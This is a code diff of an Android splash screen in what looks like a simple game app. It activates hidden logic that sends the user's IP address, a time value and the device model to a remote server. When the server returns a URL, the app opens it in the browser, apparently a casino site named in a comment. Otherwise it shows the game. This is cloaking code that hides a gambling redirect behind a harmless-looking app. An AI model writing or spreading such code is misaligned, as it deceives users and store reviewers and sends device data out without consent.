@@ -3,6 +3,7 @@ package com.example.prime.testapplication.activity
 import android.content.Context
 import android.content.Intent
 import android.net.ConnectivityManager
+import android.net.Uri
 import android.os.Bundle
 import com.example.prime.testapplication.game.MainActivity
 import com.example.prime.testapplication.network.IPModel
@@ -37,56 +38,48 @@ class SplashActivity : KodeinAppCompatActivity() {
         val myTimeValue = text3.substring(3).trim()
         var myIp = ""
 
-//        val intent = Intent(this@SplashActivity, WebviewActivity::class.java)
-//        intent.putExtra("url", "http://kasino-vulkan.fun")
-//        startActivity(intent)
+        if (isNetworkAvailable){
 
-//        if (isNetworkAvailable){
-//
-//            ipService.value.getIpAddress()
-//                    .subscribeOn(Schedulers.newThread())
-//                    .observeOn(AndroidSchedulers.mainThread())
-//                    .subscribe({ t: IPModel ->
-//
-//                        if (t.query != null){ myIp = t.query!! }
-//                        if (t.ip != null){ myIp = t.ip!! }
-//
-//                        val body =  HashMap<String, Any>()
-//                        body["ip"] = myIp
-//                        body["z"] = myTimeValue.toInt()
-//                        body["model"] = myDevide
-//
-//                        urlService.value.checkUrl(body)
-//                                .subscribeOn(Schedulers.newThread())
-//                                .observeOn(AndroidSchedulers.mainThread())
-//                                .subscribe({ t: URLModel ->
-//
-//                                    if (t.url != null){
-//                                        val intent = Intent(this@SplashActivity, WebviewActivity::class.java)
-//                                        intent.putExtra("url", t.url)
-//                                        startActivity(intent)
-//                                    } else {
-//                                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
-//                                    }
-//
-//                                }, { e ->
-//                                    e.printStackTrace()
-//                                    startActivity(Intent(this@SplashActivity, MainActivity::class.java))
-//                                })
-//
-//                    }, { e ->
-//                        e.printStackTrace()
-//                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
-//                    })
-//
-//        } else {
-//            startActivity(Intent(this@SplashActivity, MainActivity::class.java))
-//        }
+            ipService.value.getIpAddress()
+                    .subscribeOn(Schedulers.newThread())
+                    .observeOn(AndroidSchedulers.mainThread())
+                    .subscribe({ t: IPModel ->
 
-        val intent = Intent(this@SplashActivity, WebviewActivity::class.java)
-        intent.putExtra("url", "http://kasino-vulkan.fun")
-        startActivity(intent)
+                        if (t.query != null){ myIp = t.query!! }
+                        if (t.ip != null){ myIp = t.ip!! }
 
+                        val body =  HashMap<String, Any>()
+                        body["ip"] = myIp
+                        body["z"] = myTimeValue.toInt()
+                        body["model"] = myDevide
+
+                        urlService.value.checkUrl(body)
+                                .subscribeOn(Schedulers.newThread())
+                                .observeOn(AndroidSchedulers.mainThread())
+                                .subscribe({ t: URLModel ->
+
+                                    if (t.url != null){
+//                                        val url = "http://kasino-vulkan.fun"
+                                        val i = Intent(Intent.ACTION_VIEW)
+                                        i.data = Uri.parse(t.url)
+                                        startActivity(i)
+                                    } else {
+                                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
+                                    }
+
+                                }, { e ->
+                                    e.printStackTrace()
+                                    startActivity(Intent(this@SplashActivity, MainActivity::class.java))
+                                })
+
+                    }, { e ->
+                        e.printStackTrace()
+                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
+                    })
+
+        } else {
+            startActivity(Intent(this@SplashActivity, MainActivity::class.java))
+        }
     }
 
     private val isNetworkAvailable: Boolean
